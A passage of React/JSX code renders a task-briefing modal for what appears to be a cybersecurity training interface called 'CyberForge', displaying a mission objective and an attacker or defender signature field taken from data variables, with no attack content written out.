                  <h3 className="text-lg font-bold text-white tracking-tight">{selectedTask.title}</h3>
                  <span
                    className={`inline-block text-[11px] font-mono uppercase tracking-wider ${
                      isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'
                    }`}
                  >
                    {selectedTask.badge}
                  </span>
                </div>
              </div>
              <button
                onClick={() => setSelectedTask(null)}
                className="p-1.5 rounded-lg bg-zinc-800/60 hover:bg-zinc-700 text-zinc-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Modal Body */}
            <div className="space-y-4 text-xs sm:text-sm text-zinc-300 leading-relaxed">
              <div>
                <span className="block text-[11px] font-mono uppercase text-zinc-500 mb-1">Mission Objective</span>
                <p className="bg-[#141824] p-3 rounded-xl border border-white/5 font-mono text-zinc-200">
                  {selectedTask.details}
                </p>
              </div>

              <div>
                <span className="block text-[11px] font-mono uppercase text-zinc-500 mb-1">
                  {isAttacker ? 'Exploit Vector Signature' : 'Defense Rule Signature'}
                </span>
                <div className="bg-[#08090f] p-3 rounded-xl border border-white/10 font-mono text-[11px] sm:text-xs overflow-x-auto text-amber-300/90">
                  <code>{selectedTask.vector}</code>
                </div>
              </div>
            </div>

            {/* Modal Footer */}
            <div className="mt-6 pt-4 border-t border-white/10 flex items-center justify-between">
              <span className="text-[11px] font-mono text-zinc-500">CyberForge Module Briefing</span>
              <button
                onClick={() => setSelectedTask(null)}
                className={`px-5 py-2 rounded-xl text-xs font-semibold text-white transition-all ${
                  isAttacker
                    ? 'bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 shadow-[0_0_15px_rgba(255,42,61,0.4)]'
                    : 'bg-gradient-to-r from-sky-500 to-sky-600 hover:from-sky-400 hover:to-sky-500 shadow-[0_0_15px_rgba(42,183,255,0.4)]'
                }`}
              >
                Close Briefing
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
